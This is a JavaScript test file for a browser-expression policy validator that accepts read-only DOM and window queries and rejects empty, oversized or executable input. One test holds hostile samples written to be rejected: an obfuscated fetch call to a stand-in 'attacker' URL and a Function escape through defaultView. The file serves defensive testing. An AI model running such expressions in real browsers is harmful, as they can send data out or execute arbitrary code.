import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { validateBrowserExpression } from '../../src/channels/browser-evaluate-policy.js';

describe('browser evaluate policy', () => {
  it('accepts simple read-only document and window fields', () => {
    assert.equal(validateBrowserExpression('document.title'), null);
    assert.equal(validateBrowserExpression('window.innerWidth'), null);
  });

  it('accepts arithmetic-only expressions', () => {
    assert.equal(validateBrowserExpression(' (1 + 2) * 3 '), null);
  });

  it('accepts selector-based read-only expressions', () => {
    assert.equal(validateBrowserExpression('document.querySelector("#price").textContent'), null);
    assert.equal(validateBrowserExpression('document.querySelectorAll(".item").length'), null);
  });

  it('rejects missing/empty values', () => {
    assert.match(validateBrowserExpression(''), /Missing required field/i);
    assert.match(validateBrowserExpression('   '), /Missing required field/i);
    assert.match(validateBrowserExpression(null), /Missing required field/i);
  });

  it('rejects dynamic or executable expressions', () => {
    assert.match(
      validateBrowserExpression("window[['f','etch'].join('')]('https://attacker')"),
      /read-only browser queries/i,
    );
    assert.match(
      validateBrowserExpression('document.querySelector(`${document.title}`).textContent'),
      /read-only browser queries/i,
    );
    assert.match(
      validateBrowserExpression('document.querySelector("#x").ownerDocument.defaultView.Function'),
      /read-only browser queries/i,
    );
  });

  it('rejects oversized expressions', () => {
    const tooLong = 'a'.repeat(4001);
    assert.match(validateBrowserExpression(tooLong), /maximum length/i);
  });
});
